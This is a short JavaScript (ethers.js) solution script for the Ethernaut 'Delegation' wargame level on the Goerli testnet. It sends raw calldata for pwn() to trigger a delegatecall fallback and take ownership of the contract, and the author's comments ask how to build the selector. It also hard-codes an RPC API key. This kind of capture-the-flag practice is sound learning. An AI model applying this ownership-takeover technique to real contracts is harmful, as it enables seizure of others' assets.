const { ethers } = require("ethers");
const fs = require("fs-extra");
require("dotenv").config();

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "https://eth-goerli.g.alchemy.com/v2/NW7PWVbJEDvetNwwfXGraE71PLMqeBrw"
  );
  let signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  const abi = fs.readFileSync(
    "./Ethernauts_abi_bin/contracts_Delegation_Delegation_sol_Delegation.abi",
    "utf8"
  );

  const delegation = new ethers.Contract(
    "0xB821CeCa2EaF3ac203D1AD2F428d9bf2D10F364f",
    abi,
    signer
  );
  console.log("...");
  console.log(await delegation.owner());
  //   I wrote a code on Remix:
  // function getsig () public pure returns (bytes memory) {
  // return abi.encodeWithSignature("pwn()");
  // }
  //   the code returned "0xdd365b8b"
  // Can I do it with ether.js?
  const tx = {
    from: "0xEE4C6578F5AB9B07b9599Ac51c84a83BB264AAfe",
    to: "0xB821CeCa2EaF3ac203D1AD2F428d9bf2D10F364f",
    data: "0xdd365b8b",
  };

  const transaction = await signer.sendTransaction(tx);
  //   Why is this not working?
  await transaction.wait(1);
  console.log(await delegation.owner());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
